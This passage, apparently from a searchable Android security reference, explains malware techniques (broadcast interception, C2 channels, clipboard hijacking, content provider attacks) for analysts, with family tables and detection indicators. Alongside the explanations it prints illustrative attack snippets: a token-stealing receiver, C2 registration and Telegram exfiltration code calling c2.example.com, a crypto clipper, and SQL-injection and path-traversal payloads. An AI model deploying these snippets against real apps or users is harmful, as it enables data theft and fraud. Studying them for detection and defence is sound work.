<p><code>ACTION_BATTERY_CHANGED</code> is still a sticky broadcast and leaks detailed battery information without any permission.</p>"},{"location":"attacks/broadcast-theft/#custom-broadcast-interception","title":"Custom Broadcast Interception","text":"<p>Apps that define custom broadcast actions without permission protection are vulnerable:</p> <pre><code>sendBroadcast(new Intent(\"com.myapp.USER_LOGGED_IN\")\n    .putExtra(\"token\", authToken));\n</code></pre> <p>Any app with a matching receiver sees this:</p> <pre><code>&lt;receiver android:name=\".TokenStealer\" android:exported=\"true\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"com.myapp.USER_LOGGED_IN\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre>"},{"location":"attacks/broadcast-theft/#boot-broadcast-race","title":"Boot Broadcast Race","text":"<p>Multiple apps receiving <code>BOOT_COMPLETED</code> race to start. Malware that starts first can interfere with security software that starts later.</p>"},{"location":"attacks/broadcast-theft/#security-relevant-system-broadcasts","title":"Security-Relevant System Broadcasts","text":"Broadcast Data Exposed Permission Required <code>SMS_RECEIVED</code> SMS content, sender <code>RECEIVE_SMS</code> <code>WAP_PUSH_RECEIVED</code> MMS push data <code>RECEIVE_WAP_PUSH</code> <code>NEW_OUTGOING_CALL</code> Dialed number <code>PROCESS_OUTGOING_CALLS</code> <code>PHONE_STATE</code> Call state, phone number <code>READ_PHONE_STATE</code> <code>BATTERY_CHANGED</code> Battery level, charging, temperature None <code>CONNECTIVITY_CHANGE</code> Network state changes None (deprecated API 28) <code>PACKAGE_ADDED/REMOVED</code> Package name of installed/removed app None <code>BOOT_COMPLETED</code> Device booted <code>RECEIVE_BOOT_COMPLETED</code>"},{"location":"attacks/broadcast-theft/#android-version-changes","title":"Android Version Changes","text":"<p>Android 3.1 (API 12): apps in stopped state don't receive broadcasts. Must be launched once.</p> <p>Android 4.4 (API 19): only default SMS app can abort <code>SMS_RECEIVED</code>.</p> <p>Android 5.0 (API 21): sticky broadcasts deprecated.</p> <p>Android 8.0 (API 26): implicit broadcast restrictions. Most implicit broadcasts no longer delivered to manifest-registered receivers. Apps must register receivers dynamically in code, meaning the app must be running. Exceptions: <code>BOOT_COMPLETED</code>, <code>LOCALE_CHANGED</code>, and a few others.</p> <p>Android 14 (API 34): context-registered receivers must declare <code>RECEIVER_EXPORTED</code> or <code>RECEIVER_NOT_EXPORTED</code> flag.</p>"},{"location":"attacks/broadcast-theft/#families-using-this-technique","title":"Families Using This Technique","text":"<p>SMS and broadcast interception is used by virtually every banking trojan for OTP theft. This table covers the primary use case for each family.</p> Family Broadcast Type Purpose Cerberus SMS_RECEIVED 2FA OTP interception Anubis SMS_RECEIVED OTP theft, SMS forwarding to C2 Hook SMS_RECEIVED OTP interception during ATS Ermac SMS_RECEIVED 2FA bypass GodFather SMS_RECEIVED, PHONE_STATE OTP theft, call state monitoring Hydra SMS_RECEIVED OTP interception Octo SMS_RECEIVED OTP interception during remote access Medusa SMS_RECEIVED 2FA bypass Xenomorph SMS_RECEIVED OTP capture for ATS engine Anatsa SMS_RECEIVED OTP theft during automated transfers FluBot SMS_RECEIVED OTP theft, SMS worm propagation Joker SMS_RECEIVED Premium subscription OTP confirmation GriftHorse SMS_RECEIVED Premium SMS confirmation interception Harly SMS_RECEIVED Subscription confirmation codes SpyNote SMS_RECEIVED, PHONE_STATE Full SMS/call surveillance Rafel RAT SMS_RECEIVED SMS interception, ransomware unlock codes TrickMo SMS_RECEIVED OTP theft, originally TrickBot 2FA bypass Vultur SMS_RECEIVED OTP interception SharkBot SMS_RECEIVED OTP capture for ATS Chameleon SMS_RECEIVED 2FA bypass after biometric prompt disable Mamont SMS_RECEIVED Notification and SMS interception TsarBot SMS_RECEIVED OTP capture, 750+ target apps Antidot SMS_RECEIVED 2FA interception Crocodilus SMS_RECEIVED OTP theft during DTO Copybara SMS_RECEIVED OTP interception Fakecalls NEW_OUTGOING_CALL Call interception and redirection MoqHao SMS_RECEIVED, PACKAGE_ADDED SMS theft, app install monitoring Alien SMS_RECEIVED Notification sniffing for 2FA codes BRATA SMS_RECEIVED OTP theft before factory reset BankBot SMS_RECEIVED Early SMS-based OTP theft Albiriox SMS_RECEIVED OTP interception FireScam SMS_RECEIVED Notification and SMS interception across all apps DeVixor SMS_RECEIVED OTP interception for Iranian banking fraud <p>Fakecalls is unique in using <code>NEW_OUTGOING_CALL</code> to intercept outgoing calls to bank numbers and redirect them to attacker-controlled lines with pre-recorded IVR audio.</p>"},{"location":"attacks/broadcast-theft/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Look for:</p> <ul> <li><code>BroadcastReceiver</code> with high <code>android:priority</code> (especially for <code>SMS_RECEIVED</code>)</li> <li>Receivers for system broadcasts containing sensitive data</li> <li>Custom broadcasts sent with sensitive extras and no permission parameter</li> <li><code>sendBroadcast()</code> without <code>LocalBroadcastManager</code> for internal communication</li> </ul>"},{"location":"attacks/c2-techniques/","title":"C2 Communication Techniques","text":"<p>How Android malware talks to its command-and-control infrastructure. The C2 channel determines how commands reach the device, how stolen data leaves, and how resilient the operation is against takedowns. Most families use multiple channels for redundancy.</p>"},{"location":"attacks/c2-techniques/#requirements","title":"Requirements","text":"Requirement Details Permission <code>INTERNET</code> (auto-granted, normal protection level) Optional <code>RECEIVE_SMS</code> for SMS-based C2, <code>RECEIVE_BOOT_COMPLETED</code> for persistent reconnection Infrastructure At least one C2 server, domain, or third-party service account"},{"location":"attacks/c2-techniques/#c2-methods","title":"C2 Methods","text":""},{"location":"attacks/c2-techniques/#httphttps-rest-apis","title":"HTTP/HTTPS REST APIs","text":"<p>The most common C2 channel. Malware sends HTTP POST requests to a hardcoded or dynamically resolved endpoint, typically JSON-encoded. The C2 responds with commands in the same format.</p> <pre><code>URL url = new URL(\"https://c2.example.com/gate.php\");\nHttpURLConnection conn = (HttpURLConnection) url.openConnection();\nconn.setRequestMethod(\"POST\");\nconn.setRequestProperty(\"Content-Type\", \"application/json\");\nconn.setDoOutput(true);\n\nJSONObject payload = new JSONObject();\npayload.put(\"bot_id\", deviceId);\npayload.put(\"action\", \"register\");\npayload.put(\"apps\", installedPackages);\n\nOutputStream os = conn.getOutputStream();\nos.write(payload.toString().getBytes());\nos.flush();\n</code></pre> <p>Advantages: works through any network, blends with normal traffic, easy to implement. Disadvantages: requires active server, domains can be seized, traffic is inspectable if pinning is absent.</p> <p>Used by: BRATA, Hydra, Cerberus, Octo, most banking trojans.</p>"},{"location":"attacks/c2-techniques/#websocket-persistent-connections","title":"WebSocket Persistent Connections","text":"<p>Maintains a persistent bidirectional connection for real-time command delivery. The C2 server can push commands instantly without polling.</p> <pre><code>OkHttpClient client = new OkHttpClient();\nRequest request = new Request.Builder()\n    .url(\"wss://c2.example.com/ws\")\n    .build();\n\nWebSocket ws = client.newWebSocket(request, new WebSocketListener() {\n    @Override\n    public void onMessage(WebSocket webSocket, String text) {\n        JSONObject cmd = new JSONObject(text);\n        executeCommand(cmd.getString(\"type\"), cmd);\n    }\n});\n</code></pre> <p>Lower latency than polling HTTP. Enables interactive remote access sessions -- screen streaming, real-time VNC. Connection drop is immediately visible to both sides.</p> <p>Used by: Hook, Medusa, Octo v2.</p>"},{"location":"attacks/c2-techniques/#firebase-cloud-messaging-fcm","title":"Firebase Cloud Messaging (FCM)","text":"<p>Abuses Google's push notification infrastructure as a C2 wake-up channel. The malware registers with FCM using the attacker's Firebase project credentials, then receives push messages containing commands. FCM traffic is indistinguishable from legitimate app notifications.</p> <pre><code>FirebaseMessaging.getInstance().getToken()\n    .addOnCompleteListener(task -&gt; {\n        String token = task.getResult();\n        sendTokenToC2(token);\n    });\n</code></pre> <pre><code>public class C2MessagingService extends FirebaseMessagingService {\n    @Override\n    public void onMessageReceived(RemoteMessage message) {\n        Map&lt;String, String&gt; data = message.getData();\n        String command = data.get(\"cmd\");\n        String args = data.get(\"args\");\n        executeCommand(command, args);\n    }\n}\n</code></pre> <p>Google can revoke the Firebase project, but the attacker just creates a new one. The malware often uses FCM only as a wake-up signal, then connects back to the primary HTTP C2 for actual data transfer.</p> <p>Used by: Ermac, Cerberus, GodFather, Anatsa.</p>"},{"location":"attacks/c2-techniques/#telegram-bot-api","title":"Telegram Bot API","text":"<p>Uses Telegram's Bot API for bidirectional C2. The malware contains a bot token and chat ID, sends stolen data as Telegram messages, and polls <code>getUpdates</code> for commands. Telegram's infrastructure provides built-in encryption, CDN distribution, and censorship resistance.</p> <pre><code>String botToken = \"6234871:AAF...encrypted_token\";\nString chatId = \"-100198765432\";\nString apiUrl = \"https://api.telegram.org/bot\" + botToken + \"/sendMessage\";\n\nJSONObject payload = new JSONObject();\npayload.put(\"chat_id\", chatId);\npayload.put(\"text\", \"New victim: \" + deviceId + \"\\nApps: \" + appList);\n\nHttpPost post = new HttpPost(apiUrl);\npost.setEntity(new StringEntity(payload.toString()));\n</code></pre> <p>Telegram C2 is hard to take down because blocking api.telegram.org disrupts legitimate Telegram usage. The bot token can be rotated easily if compromised.</p> <p>Used by: Anubis, Mamont, Cerberus (dead drop), SpyNote (some variants).</p>"},{"location":"attacks/c2-techniques/#dead-drop-resolvers","title":"Dead Drop Resolvers","text":"<p>The malware does not hardcode the C2 address directly. Instead, it fetches the real C2 URL from a public service that the attacker controls. If the C2 goes down, the attacker updates the dead drop with a new address without needing to update the malware.</p> <p>Common dead drop platforms:</p> Platform Method Example Telegram Public channel with pinned message containing encrypted C2 URL Channel bio or pinned post has Base64-encoded address Pastebin Paste containing encrypted/encoded C2 address <code>https://pastebin.com/raw/XXXXXX</code> GitHub Repository file or gist with C2 info README or config file in a public repo Twitter/X Tweet or bio containing encoded address Profile bio with hex-encoded URL YouTube Video description with hidden C2 string Comment or description field <p>Cerberus stored encrypted C2 URLs in a Twitter bio. GodFather used Telegram channel descriptions. MoqHao used Pinterest profile descriptions.</p>"},{"location":"attacks/c2-techniques/#dns-tunneling-and-dns-over-https","title":"DNS Tunneling and DNS-over-HTTPS","text":"<p>Encodes C2 data inside DNS queries. The malware makes DNS lookups for subdomains like <code>base64data.evil.com</code>, and the authoritative DNS server decodes the subdomain to extract data. Responses come back as TXT or CNAME records.</p> <p>DNS-over-HTTPS (DoH) variant sends DNS queries as HTTPS requests to resolvers like <code>https://dns.google/resolve?name=...</code>, bypassing traditional DNS monitoring entirely. This doubles as a way to resolve DGA domains without touching the device's configured DNS.</p> <p>Less common on Android than on desktop malware due to implementation complexity, but observed in targeted espionage tools.</p>"},{"location":"attacks/c2-techniques/#mqtt-protocol","title":"MQTT Protocol","text":"<p>Lightweight publish/subscribe messaging protocol designed for IoT. Some malware families use public MQTT brokers (like mqtt.eclipseprojects.io) for C2, publishing commands to bot-specific topics.</p> <p>Low overhead, persistent connections, works well on unreliable mobile networks. Hard to distinguish from legitimate IoT traffic.</p>"},{"location":"attacks/c2-techniques/#sms-based-c2","title":"SMS-Based C2","text":"<p>The malware receives commands via incoming SMS messages from a specific number or matching a specific format. Older technique, still used as a fallback when internet connectivity is unavailable.</p> <p>Commands are typically short codes: <code>#lock#</code>, <code>#sms_forward#ON</code>, <code>#wipe#</code>. The malware's <code>BroadcastReceiver</code> intercepts the SMS before the default messaging app displays it.</p> <p>Disadvantages: sender number is traceable, SMS costs money at scale, limited payload size.</p> <p>Used by: BankBot, early Anubis variants, Rafel RAT.</p>"},{"location":"attacks/c2-techniques/#sftpftp-exfiltration","title":"SFTP/FTP Exfiltration","text":"<p>Direct file upload for exfiltrating large data: screen recordings, keylog files, photo archives. The malware connects to an attacker-controlled SFTP server and uploads files on a schedule or when triggered.</p> <p>Vultur uses SFTP (via JSch library) specifically for uploading screen recordings, keeping its HTTP C2 channel separate for commands.</p>"},{"location":"attacks/c2-techniques/#toronion-routing","title":"Tor/Onion Routing","text":"<p>Routes C2 traffic through the Tor network, hiding the server's real IP address. The malware either bundles Tor libraries or uses Orbot as a proxy. The C2 runs as a .onion hidden service.</p> <p>Adds significant latency and battery drain. Increases APK size if Tor is bundled. Some families use Tor only for C2 registration and fall back to direct HTTPS for data transfer.</p>"},{"location":"attacks/c2-techniques/#domain-generation-algorithms-dga","title":"Domain Generation Algorithms (DGA)","text":"<p>The malware generates a list of pseudo-random domain names using a seed (date, hardcoded value, or external input). The attacker registers one or more of these domains ahead of time. If a domain is seized, the algorithm generates new candidates the next day.</p> <pre><code>public String generateDomain(int dayOfYear, int year) {\n    long seed = (dayOfYear * 1000L) + year;\n    Random rng = new Random(seed);\n    StringBuilder domain = new StringBuilder();\n    int len = rng.nextInt(8) + 8;\n    for (int i = 0; i &lt; len; i++) {\n        domain.append((char) ('a' + rng.nextInt(26)));\n    }\n    domain.append(\".com\");\n    return domain.toString();\n}\n</code></pre> <p>The defender must reverse the DGA to predict and preemptively sinkhole future domains. DGA is less common on Android than on desktop botnets, but has been observed in Anubis and FluBot.</p>"},{"location":"attacks/c2-techniques/#certificate-pinning-on-c2-traffic","title":"Certificate Pinning on C2 Traffic","text":"<p>Malware pinning its own C2 server's certificate to prevent interception by analysts or network security tools. The attacker embeds the server certificate or public key hash in the APK and rejects any connection where the certificate doesn't match.</p> <p>This is the reverse of the usual scenario: instead of a legitimate app pinning its server, the malware pins the attacker's server. An analyst running mitmproxy sees the connection fail unless they patch out the pinning logic first.</p>"},{"location":"attacks/c2-techniques/#c2-method-comparison","title":"C2 Method Comparison","text":"Method Stealth Reliability Latency Bandwidth Takedown Resistance HTTP/HTTPS Medium High Low High Low -- domain seizure WebSocket Medium Medium Very Low High Low FCM Very High High Low Low Medium -- project revocation Telegram Bot High Very High Medium Medium High Dead Drop High Medium High Very Low High DNS Tunnel Very High Medium High Very Low High MQTT High Medium Low Medium Medium SMS Low Low Medium Very Low Low -- traceable SFTP/FTP Low High Medium Very High Low Tor Very High Low Very High Medium Very High DGA Medium Medium High High High"},{"location":"attacks/c2-techniques/#families-by-primary-c2-type","title":"Families by Primary C2 Type","text":"Family Primary C2 Secondary C2 Exfiltration Anubis HTTP REST Telegram Bot HTTP POST Ermac HTTP REST FCM wake-up HTTP POST Hook WebSocket HTTP REST WebSocket Cerberus HTTP REST Telegram dead drop, FCM HTTP POST Medusa WebSocket HTTP REST WebSocket SpyNote Custom TCP None TCP socket Vultur HTTP REST FCM wake-up SFTP Mamont Telegram Bot None Telegram API BRATA HTTP REST None HTTP POST GodFather HTTP REST Telegram dead drop, FCM HTTP POST Octo HTTP REST WebSocket (v2) HTTP POST Hydra HTTP REST None HTTP POST Anatsa HTTP REST FCM wake-up HTTP POST FluBot HTTP REST + DGA DNS-based DGA HTTP POST MoqHao HTTP REST Dead drop (Pinterest/Imgur) HTTP POST Xenomorph HTTP REST None HTTP POST Chameleon HTTP REST None HTTP POST TrickMo HTTP REST None HTTP POST Copybara HTTP REST MQTT HTTP POST"},{"location":"attacks/c2-techniques/#network-analysis","title":"Network Analysis","text":""},{"location":"attacks/c2-techniques/#intercepting-c2-traffic","title":"Intercepting C2 Traffic","text":"<p>Setting up mitmproxy to capture C2 communications during dynamic analysis:</p> <ol> <li>Install mitmproxy CA certificate on the test device</li> <li>Configure Wi-Fi proxy or use transparent proxy with iptables</li> <li>If malware pins its C2 certificate, patch the APK to remove pinning (Frida <code>ssl_pinning_bypass.js</code> or manual smali edit)</li> <li>Monitor for registration beacons, command polling intervals, and exfiltration uploads</li> </ol>"},{"location":"attacks/c2-techniques/#identifying-c2-patterns","title":"Identifying C2 Patterns","text":"<p>Common indicators in network traffic:</p> <ul> <li>Periodic POST requests to the same endpoint (heartbeat/polling)</li> <li>JSON payloads containing device identifiers, IMEI, installed app lists</li> <li>Base64-encoded or encrypted request bodies</li> <li>Requests to <code>api.telegram.org</code> with bot tokens</li> <li>FCM registration tokens sent to non-Google servers</li> <li>Connections to known MQTT brokers</li> <li>DNS queries for high-entropy domain names (DGA indicator)</li> <li>WebSocket upgrades to suspicious endpoints</li> </ul>"},{"location":"attacks/c2-techniques/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Static indicators:</p> <ul> <li>Hardcoded URLs, IPs, or domain patterns in strings/resources</li> <li>Telegram bot tokens (format: <code>[0-9]+:AA[A-Za-z0-9_-]+</code>)</li> <li>Firebase configuration files (<code>google-services.json</code>) with unexpected project IDs</li> <li>JSch or other SSH/SFTP library imports</li> <li><code>WebSocketListener</code> or OkHttp WebSocket usage</li> <li><code>DnsOverHttps</code> or custom DNS resolution code</li> <li>Certificate pinning implementations (custom <code>TrustManager</code>, <code>CertificatePinner</code>)</li> </ul> <p>Dynamic indicators:</p> <ul> <li>Outbound connections immediately after first launch</li> <li>Periodic network requests at fixed intervals</li> <li>Data sent to Telegram API endpoints</li> <li>Large file uploads to SFTP servers</li> <li>Connections to Tor entry nodes or .onion addresses</li> </ul>"},{"location":"attacks/clipboard-hijacking/","title":"Clipboard Hijacking","text":"<p>Monitoring or modifying clipboard contents to steal sensitive data. Android's <code>ClipboardManager</code> API provides a system-wide clipboard that any foreground app can read and write. Malware abuses this to intercept cryptocurrency wallet addresses, passwords, OTPs, and banking data as users copy and paste between apps. The most destructive variant, the crypto clipper, silently replaces a copied wallet address with one controlled by the attacker, redirecting transactions without the victim noticing.</p>"},{"location":"attacks/clipboard-hijacking/#requirements","title":"Requirements","text":"Requirement Details Permission None for foreground access. <code>BIND_ACCESSIBILITY_SERVICE</code> for background or silent clipboard reads on Android 10+. Condition App must be in foreground, or running an accessibility service, to access clipboard on Android 10+"},{"location":"attacks/clipboard-hijacking/#how-it-works","title":"How It Works","text":""},{"location":"attacks/clipboard-hijacking/#clipboardmanager-listener","title":"ClipboardManager Listener","text":"<p>The primary mechanism. The app registers a listener that fires every time clipboard content changes:</p> <pre><code>ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);\ncm.addPrimaryClipChangedListener(() -&gt; {\n    ClipData clip = cm.getPrimaryClip();\n    String text = clip.getItemAt(0).getText().toString();\n    if (matchesCryptoAddress(text)) {\n        cm.setPrimaryClip(ClipData.newPlainText(\"\", attackerWallet));\n    }\n});\n</code></pre> <p>The listener runs in the app's process. On Android 10+, the app must be in the foreground or running a foreground service to receive clipboard change events. Malware circumvents this by maintaining a persistent foreground notification (often disguised as a system service) or by using an accessibility service.</p>"},{"location":"attacks/clipboard-hijacking/#accessibility-based-clipboard-reading","title":"Accessibility-Based Clipboard Reading","text":"<p>An accessibility service can read clipboard contents without triggering the user-visible clipboard access toast introduced in Android 12. The service monitors <code>TYPE_VIEW_TEXT_CHANGED</code> and <code>TYPE_WINDOW_CONTENT_CHANGED</code> events, then reads the clipboard when it detects the user has performed a paste action or is interacting with a text field in a target app.</p> <p>On pre-Android 10 devices, accessibility services can read clipboard at any time without restriction. On Android 10+, the accessibility service still has unrestricted clipboard access, making it the preferred method for modern malware.</p>"},{"location":"attacks/clipboard-hijacking/#contentobserver-on-clipboard-uri","title":"ContentObserver on Clipboard URI","text":"<p>Some families register a <code>ContentObserver</code> on the clipboard content URI to detect changes passively. This is less common than the listener approach but achieves the same result with a different triggering mechanism.</p>"},{"location":"attacks/clipboard-hijacking/#attack-patterns","title":"Attack Patterns","text":""},{"location":"attacks/clipboard-hijacking/#crypto-address-replacement-clipper","title":"Crypto Address Replacement (Clipper)","text":"<p>The highest-value clipboard attack. The malware monitors for cryptocurrency wallet addresses using regex patterns, then replaces them with attacker-controlled addresses before the user pastes:</p> Cryptocurrency Address Pattern Example Regex Bitcoin (BTC) Starts with <code>1</code>, <code>3</code>, or <code>bc1</code>, 26-62 chars <code>^(bc1\\|[13])[a-zA-HJ-NP-Z0-9]{25,62}$</code> Ethereum (ETH) Starts with <code>0x</code>, 42 hex chars <code>^0x[0-9a-fA-F]{40}$</code> TRON (TRX) Starts with <code>T</code>, 34 chars <code>^T[1-9A-HJ-NP-Za-km-z]{33}$</code> Litecoin (LTC) Starts with <code>L</code>, <code>M</code>, or <code>ltc1</code> <code>^(ltc1\\|[LM])[a-zA-HJ-NP-Z0-9]{25,62}$</code> Ripple (XRP) Starts with <code>r</code>, 25-35 chars <code>^r[0-9a-zA-Z]{24,34}$</code> <p>The replacement is instant. The user copies a legitimate address from an exchange or message, the malware swaps it, and the user pastes the attacker's address into their wallet app. The transaction confirmation screen shows the attacker's address, but most users don't compare the full address string.</p> <p>Some families maintain multiple attacker wallets and select the replacement address based on the cryptocurrency type and address format detected.</p>"},{"location":"attacks/clipboard-hijacking/#credential-harvesting","title":"Credential Harvesting","text":"<p>Malware monitors clipboard for patterns matching:</p> <ul> <li>Passwords (copied from password managers)</li> <li>Email addresses</li> <li>Phone numbers</li> <li>Banking card numbers (matching Luhn algorithm patterns)</li> <li>API keys and tokens</li> </ul> <p>Anything copied is logged and exfiltrated to C2. Users routinely copy credentials from password managers, notes apps, and messages, creating a steady stream of sensitive data through the clipboard.</p>"},{"location":"attacks/clipboard-hijacking/#otp-theft","title":"OTP Theft","text":"<p>When a user receives a one-time password via SMS or authenticator app and copies it, the clipboard briefly contains the OTP. Malware with a clipboard listener captures this immediately. Combined with other stolen credentials, this enables account takeover. Some banking apps auto-fill OTPs from SMS, but users who manually copy-paste from their SMS app or authenticator expose the code through clipboard.</p>"},{"location":"attacks/clipboard-hijacking/#android-version-changes","title":"Android Version Changes","text":"Version Change Impact on Attack Android 10 (API 29) Background apps cannot read clipboard Malware must maintain foreground state or use accessibility service. Accessibility bypass remains fully effective. Android 12 (API 31) Toast notification when an app reads clipboard User sees \"[App] pasted from your clipboard\" toast. Accessibility services bypass this notification. Apps that set clipboard data themselves don't trigger it. Android 12 (API 31) <code>ClipDescription.getConfidential()</code> flag Keyboard and IME apps can mark clipboard content as sensitive, preventing it from appearing in content suggestions. Does not prevent programmatic reads. Android 13 (API 33) Clipboard auto-cleared after approximately 1 hour Limits the time window for passive clipboard monitoring. Active listeners still capture content in real-time before the auto-clear. Crypto clippers are unaffected since they operate at the moment of copy. Android 14 (API 34) Background activity launch restrictions tightened Harder for background apps to bring themselves to foreground for clipboard access. Accessibility services unaffected. <p>The clipboard access toast in Android 12 is the most visible mitigation, but it only appears for reads, not for the initial copy event. A crypto clipper that replaces clipboard content on the <code>OnPrimaryClipChangedListener</code> callback operates before the user pastes, so the toast for the malware's clipboard write may flash briefly but is easily missed or attributed to the legitimate app.</p> <p>Accessibility services remain the consistent bypass across all Android versions. Every restriction introduced since Android 10 has an exception for accessibility, making it the reliable path for clipboard-based attacks.</p>"},{"location":"attacks/clipboard-hijacking/#families-using-this-technique","title":"Families Using This Technique","text":"Family Clipboard Capability Primary Target Cerberus Clipboard monitoring via accessibility keylogger Credentials, banking data Hook Clipboard read/write, inherits Cerberus-lineage clipboard access Credentials, banking data FireScam Continuous clipboard capture, exfiltrates copied passwords and tokens Credentials, OTPs SparkCat OCR-based crypto theft from screenshots (complements clipboard attack) Crypto seed phrases SpyAgent OCR-based crypto theft from screenshots (complements clipboard attack) Crypto seed phrases Triada System-level clipboard replacement, swaps wallet addresses during copy-paste Cryptocurrency addresses Gigabud Replaces bank card numbers in clipboard with attacker-controlled numbers Banking card numbers BTMOB RAT Continuous clipboard monitoring for wallet addresses, passwords, and OTPs Crypto, credentials, OTPs SpyNote Clipboard monitoring and capture as part of full surveillance suite General data exfiltration Hermit Clipboard monitoring module in state-sponsored spyware toolkit Intelligence collection Gustuff Clipboard injection to fill banking transfer fields on older Android versions Banking ATS <p>Triada operates at the system level through Zygote injection or firmware-level implantation, giving it clipboard access across every process on the device without any permission requirements. Gigabud specifically targets banking card numbers rather than cryptocurrency, replacing copied card numbers with attacker-controlled numbers to redirect card-based payments.</p> <p>SparkCat and SpyAgent represent an adjacent technique: rather than intercepting clipboard contents at copy time, they use OCR to scan gallery images for screenshots of crypto seed phrases. The two approaches are complementary, and a sophisticated operation could deploy both.</p>"},{"location":"attacks/clipboard-hijacking/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Static indicators:</p> <ul> <li><code>ClipboardManager</code> usage with <code>addPrimaryClipChangedListener</code></li> <li><code>setPrimaryClip</code> or <code>setPrimaryClipData</code> calls (indicates clipboard writing/replacement)</li> <li>Regex patterns matching cryptocurrency address formats (BTC, ETH, TRON, etc.)</li> <li><code>ContentObserver</code> registered against clipboard URI</li> <li>Accessibility service with <code>flagRetrieveInteractiveWindows</code> or <code>flagRequestAccessibilityButton</code></li> </ul> <p>Dynamic indicators:</p> <ul> <li>Clipboard content changes immediately after user copies a cryptocurrency address</li> <li>App maintains a foreground service with minimal visible UI</li> <li>Network exfiltration of clipboard contents to C2 after copy events</li> <li>Multiple attacker wallet addresses hardcoded or fetched from C2 configuration</li> </ul>"},{"location":"attacks/content-provider-attacks/","title":"Content Provider Attacks","text":"<p>Exploiting exposed or misconfigured <code>ContentProvider</code> components to read, modify, or delete app data. Content providers are Android's standard mechanism for sharing structured data between apps. When exported without proper permission checks, they expose databases, files, and internal state.</p>"},{"location":"attacks/content-provider-attacks/#requirements","title":"Requirements","text":"Requirement Details Permission None (if provider is exported without permission protection) Condition Target app exports a ContentProvider with insufficient access controls"},{"location":"attacks/content-provider-attacks/#how-content-providers-work","title":"How Content Providers Work","text":"<p>A content provider exposes data through a URI-based interface:</p> <pre><code>content://com.target.app.provider/users\ncontent://com.target.app.provider/users/42\n</code></pre> <p>Other apps query this using <code>ContentResolver</code>:</p> <pre><code>Cursor cursor = getContentResolver().query(\n    Uri.parse(\"content://com.target.app.provider/users\"),\n    null, null, null, null\n);\n</code></pre> <p>Providers can also serve files via <code>openFile()</code>.</p>"},{"location":"attacks/content-provider-attacks/#attack-patterns","title":"Attack Patterns","text":""},{"location":"attacks/content-provider-attacks/#sql-injection","title":"SQL Injection","text":"<p>If the provider builds SQL queries from user-supplied input without parameterization:</p> <pre><code>// Vulnerable\nString selection = \"name = '\" + userInput + \"'\";\ncursor = db.query(\"users\", null, selection, null, null, null, null);\n</code></pre> <p>Attack:</p> <pre><code>Uri uri = Uri.parse(\"content://com.target.app.provider/users\");\nCursor c = getContentResolver().query(uri, null,\n    \"1=1) UNION SELECT password,2,3 FROM credentials--\", null, null);\n</code></pre>"},{"location":"attacks/content-provider-attacks/#path-traversal","title":"Path Traversal","text":"<p>Providers that serve files via <code>openFile()</code> may be vulnerable to path traversal:</p> <pre><code>// Vulnerable\npublic ParcelFileDescriptor openFile(Uri uri, String mode) {\n    File file = new File(getContext().getFilesDir(), uri.getLastPathSegment());\n    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);\n}\n</code></pre> <p>Attack:</p> <pre><code>content://com.target.app.fileprovider/../../shared_prefs/credentials.xml\n</code></pre> <p>If <code>../</code> sequences are not stripped, the attacker reads arbitrary files within the app's storage.</p>"},{"location":"attacks/content-provider-attacks/#exported-provider-data-leakage","title":"Exported Provider Data Leakage","text":"<p>Providers exported without permission restrictions expose all their data:</p> <pre><code>&lt;provider\n    android:name=\".UserProvider\"\n    android:authorities=\"com.target.app.provider\"\n    android:exported=\"true\" /&gt;\n</code></pre> <p>Any app on the device can query all data. Oversecured's research on app protected components found that more than 80% of apps contain content provider or intent redirection vulnerabilities.</p>"},{"location":"attacks/content-provider-attacks/#permission-confusion","title":"Permission Confusion","text":"<p>Even \"protected\" providers can be exploitable:</p> <ul> <li><code>android:readPermission</code> and <code>android:writePermission</code> set globally but overridden per-path with weaker permissions</li> <li><code>android:grantUriPermissions=\"true\"</code> allows temporary URI grants that bypass protection</li> <li><code>path-permission</code> elements that don't cover all paths</li> </ul>"},{"location":"attacks/content-provider-attacks/#uri-grant-exploitation","title":"URI Grant Exploitation","text":"<p>Apps grant temporary access to content URIs:</p> <pre><code>Intent intent = new Intent();\nintent.setData(contentUri);\nintent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);\n</code></pre> <p>If the receiving app doesn't properly scope the grant, or if <code>grantUriPermissions</code> is enabled with broad <code>pathPattern</code>, an attacker may access more data than intended. Oversecured's content provider research details how intent redirection followed by URI grant exploitation provides access to arbitrary content providers. The common chain: force intent redirection to a vulnerable activity, then use <code>FLAG_GRANT_READ_URI_PERMISSION</code> with a broad <code>grantUriPermissions=\"true\"</code> declaration to access any content URI within the target app.</p>"},{"location":"attacks/content-provider-attacks/#fileprovider-misconfiguration","title":"<code>FileProvider</code> Misconfiguration","text":"<p><code>FileProvider</code> (from AndroidX) is meant to safely share files. Misconfigurations:</p> <pre><code>&lt;paths&gt;\n    &lt;root-path name=\"root\" path=\"/\" /&gt;\n&lt;/paths&gt;\n</code></pre> <p>This exposes the entire filesystem. The default template from StackOverflow answers often includes overly broad paths. Oversecured's content provider weakness catalog documents the complete chain from intent redirection to FileProvider path traversal exploitation.</p>"},{"location":"attacks/content-provider-attacks/#android-version-changes","title":"Android Version Changes","text":"<p>Android 10 (API 29): <code>android:exported</code> defaults to <code>false</code> for providers without intent filters.</p> <p>Android 12 (API 31): apps must explicitly set <code>android:exported</code> on all components.</p>"},{"location":"attacks/content-provider-attacks/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Look for:</p> <ul> <li>Providers with <code>android:exported=\"true\"</code> and no <code>android:readPermission</code>/<code>android:writePermission</code></li> <li><code>openFile()</code> implementations without path validation</li> <li>Raw SQL concatenation in <code>query()</code>, <code>update()</code>, <code>delete()</code> methods</li> <li><code>grantUriPermissions=\"true\"</code> with broad <code>path-pattern</code></li> <li><code>FileProvider</code> paths including <code>root-path</code> or broad <code>external-path</code></li> <li><code>res/xml/file_paths.xml</code> or <code>provider_paths.xml</code> for FileProvider configuration</li> </ul> <p>Tools: Drozer can enumerate and probe exported content providers automatically.</p>"},{"location":"attacks/content-provider-attacks/#vendor-specific-content-provider-vulnerabilities","title":"Vendor-Specific Content Provider Vulnerabilities","text":"<p>OEM customizations introduce content provider attack surface beyond AOSP. Oversecured's Samsung research found SMS/MMS database access via path traversal using 